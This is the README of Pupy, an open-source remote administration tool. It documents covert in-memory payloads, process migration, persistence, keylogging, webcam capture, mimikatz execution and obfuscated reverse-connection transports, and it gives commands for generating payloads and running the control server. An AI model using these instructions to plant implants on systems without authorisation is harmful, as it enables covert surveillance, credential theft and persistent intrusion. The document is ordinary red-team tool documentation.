# Pupy
Pupy is an opensource, multi-platform Remote Administration Tool with an embedded Python interpreter, allowing its modules to load python packages from memory and transparently access remote python objects. Pupy can communicate using different transports and have a bunch of cool features & modules. On Windows, Pupy uses reflective dll injection and leaves no traces on disk.

## Features :
- On windows, the Pupy payload is compiled as a reflective DLL and the whole python interpreter is loaded from memory. Pupy does not touch the disk :)
- Pupy can reflectively migrate into other processes
- Pupy can remotely import, from memory, pure python packages (.py, .pyc) and compiled python C extensions (.pyd). The imported python modules do not touch the disk. (.pyd mem import currently work on Windows only, .so memory import is not implemented). 
- Modules are quite simple to write and pupy is easily extensible.
- A lot of awesome modules are already implemented !
- Pupy uses [rpyc](https://github.com/tomerfiliba/rpyc) and a module can directly access python objects on the remote client
  - We can also access remote objects interactively from the pupy shell and even auto completion of remote attributes works !
- Communication transports are modular and pupy can communicate using obfsproxy [pluggable transports](https://www.torproject.org/docs/pluggable-transports.html.en)
- All the non interactive modules can be dispatched on multiple hosts in one command
- Multi-platform (tested on windows 7, windows xp, kali linux, ubuntu, osx)
- Modules can be executed as background jobs and their output be retrieved later
- Commands and scripts running on remote hosts are interruptible
- Auto-completion for commands and arguments
- Nice colored output :-)
- Commands aliases can be defined in the config  

## Implemented Transports :
- tcp_cleartext
	- A good example to look at, it's a protocol that does nothing
- tcp_base64
	- it's more to have a simple example
- tcp_ssl (the default one)
- obfs3
	- [A protocol to keep a third party from telling what protocol is in use based on message contents](https://gitweb.torproject.org/pluggable-transports/obfsproxy.git/tree/doc/obfs3/obfs3-protocol-spec.txt)
- scramblesuit
	- [A Polymorphic Network Protocol to Circumvent Censorship](http://www.cs.kau.se/philwint/scramblesuit/)

## Implemented Launchers :
Launchers allow pupy to run custom actions before starting the reverse connection
- simple
	- Just connect back
- auto_proxy
	- Retrieve a list of possible SOCKS/HTTP proxies and try each one of them. Proxy retriaval methods are : registry, WPAD requests, gnome settings, HTTP_PROXY env variable

## Implemented Modules :
- migrate
  - inter process architecture injection also works (x86->x64 and x64->x86)
- command execution
- interactive shell (cmd.exe, /bin/sh, /bin/bash, ...)
	- tty allocation is well supported on target running a unix system. Just looks like a ssh shell
- interactive python shell
- download
- upload
- persistence
- screenshot
- webcam snapshot
	- ~~to spy on your crush~~
- in memory execution of PE exe both x86 and x64 !
	- works very well with [mimitakz](https://github.com/gentilkiwi/mimikatz) :-)
- socks5 proxy
- local port forwarding
- shellcode exec (thanks to @byt3bl33d3r)
- keylogger
	- monitor keys, the windows titles the text is typed in and the clipboard ! (thanks @golind for the updates)
- mouselogger:
	- takes small screenshots around the mouse at each click and send them back to the server (thanks @golind)

##Quick start
###Installation :
```bash
pip install rpyc
pip install pefile 
```
####Troubleshooting:
If you have some issues with rpyc while running the server on windows, take a look at issue #25, @deathfantasy made a fix 

### Generate/run a payload
In these examples the server is running on a linux host (tested on kali linux) and it's IP address is 192.168.0.1  
The clients have been tested on (Windows 7, Windows XP, kali linux, ubuntu, Mac OS X 10.10.5) 
#### for Windows
```bash
$ ./pupygen.py auto_proxy -h
usage: auto_proxy [-h] --host <host:port>
                  [--transport {obfs3,tcp_cleartext,tcp_ssl,tcp_base64,scramblesuit}]
				                    ...
$ ./pupygen.py -t exe_x86 auto_proxy --transport tcp_ssl --host 192.168.2.132:443
binary generated with config :
OUTPUT_PATH = ~/pupy/pupyx86.exe
LAUNCHER = 'auto_proxy'
LAUNCHER_ARGS = ['--transport', 'tcp_ssl', '--host', '192.168.2.132:443']
OFFLINE_SCRIPT = None

									
```
you can also :
- use another launcher (currently simple or auto_proxy)
- use -t dll_x86 or dll_x64 to generate a reflective DLL and inject/load it by your own means.
- customize the transport used by supplying it with --transport

#### for Linux & Mac OS X
```bash
pip install rpyc #(or manually copy it if you are not admin)
python pp.py simple --transport tcp_ssl --host 127.0.0.2:443
```
you can also :
- modify the default arguments at the top of the file to call pp.py without arguments
- build a single binary with pyinstaller :
```bash
pyinstaller --onefile /full_path/pupy/pupy/pp.py
```

### start the server
1. eventually edit pupy.conf to change the bind address / port
2. start the pupy server with the transport used by the client (tcp_ssl by default):
```bash
./pupysh.py --transport <transport_used>
```

### Some screenshots
#####list connected clients
![screenshot1](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/scr1.png "screenshot1")
#####help
![screenshot3](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/help.png "screenshot3")
#####execute python code on all clients
![screenshot2](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/scr2.png "screenshot2")
#####execute a command on all clients, exception is retrieved in case the command does not exists
![screenshot4](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/scr3.png "screenshot4")
#####use a filter to send a module only on selected clients
![screenshot5](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/filters.png "screenshot5")
#####migrate into another process
![screenshot6](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/migrate.png "screenshot6")
#####interactive shell
![screenshot7](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/interactive_shell.png "screenshot7")
#####interactive python shell
![screenshot8](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/pyshell.png "screenshot8")
#####upload and run another PE exe from memory
![screenshot9](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/memory_exec.png "screenshot9")
#####list available modules (the list is not up to date)
![screenshot10](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/list_modules.png "screenshot10")

##Example: How to write a MsgBox module
first of all write the function/class you want to import on the remote client  
in the example we create the file pupy/packages/windows/all/pupwinutils/msgbox.py 
```python
import ctypes
import threading

def MessageBox(text, title):
	t=threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
	t.daemon=True
	t.start()
```
then, simply create a module to load our package and call the function remotely
```python
class MsgBoxPopup(PupyModule):
	""" Pop up a custom message box """

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="msgbox", description=self.__doc__)
		self.arg_parser.add_argument('--title', help='msgbox title')
		self.arg_parser.add_argument('text', help='text to print in the msgbox :)')

	@windows_only
	def is_compatible(self):
		pass

	def run(self, args):
		self.client.load_package("pupwinutils.msgbox")
		self.client.conn.modules['pupwinutils.msgbox'].MessageBox(args.text, args.title)
		self.log("message box popped !")

```
and that's it, we have a fully functional module :)

```bash
>> run msgbox -h
usage: msgbox [-h] [--title TITLE] text

Pop up a custom message box

positional arguments:
  text           text to print in the msgbox :)

  optional arguments:
    -h, --help     show this help message and exit
    --title TITLE  msgbox title
```

## Dependencies
rpyc (https://github.com/tomerfiliba/rpyc)  
pycrypto  
pefile  
yaml (only needed if using scramblesuit transport)  

##Roadmap and ideas
Some ideas without any priority order
- [X] ~~make the PE memory execution works interactively~~ 
- [X] ~~handle tty in interactive shell~~
- [X] ~~exfiltration through obfsproxy obfuscated network stream ?~~ 
- [X] ~~webcam snapshots~~ 
- [ ] bind payloads instead of reverse
- [ ] make the network transports stackable (for example to encapsulate SSL over scramblesuit)
- [ ] make the python compiled C extension load from memory on linux
- [ ] make the migrate modules works on linux
- [ ] add offline options to payloads like enable/disable certificate checking, embed offline modules (persistence, keylogger, ...), etc...
- [ ] integrate scapy in the windows dll :D (that would be fun)
- [ ] then make some network attack/sniffing tools modules using scapy
- [ ] work on stealthiness under unix systems
- [ ] mic recording
- [ ] socks5 udp support
- [ ] remote port forwarding
- [ ] add a wiki and write some documentation
- [ ] split the README into the wiki
- [ ] The backdoor factory ?
- [ ] Impacket ?
- [X] support for https & socks proxy
- [ ] HTTP transport
- [ ] UDP transport
- [ ] DNS transport
- [ ] ICMP transport
- [ ] bypass UAC module
- [ ] privilege elevation module
- ...
- any cool idea ?

## FAQ
> Does the server works on windows ?

Pupy server works best on linux. the server on windows has not been really tested and there is probably a lot of bugs. I try my best to code in a portable way but it don't always find the time to fix everything. If you find the courage to patch non portable code, I will gladly accept push requests ! :)

> I can't install it how does it work ?

Use pip to install all the dependencies

> hey c4n y0u add a DDOS module plzz?

No.

## Contact
by mail: contact@n1nj4.eu  
on Twitter: [Follow me on twitter](https://twitter.com/n1nj4sec)  
[![Join the chat at https://gitter.im/n1nj4sec/pupy](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/n1nj4sec/pupy?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)  
If some of you want to participate or send me a feedback, don't hesitate :-)  
  
This project is a personal development, please respect its philosophy and don't use it for evil purpose !
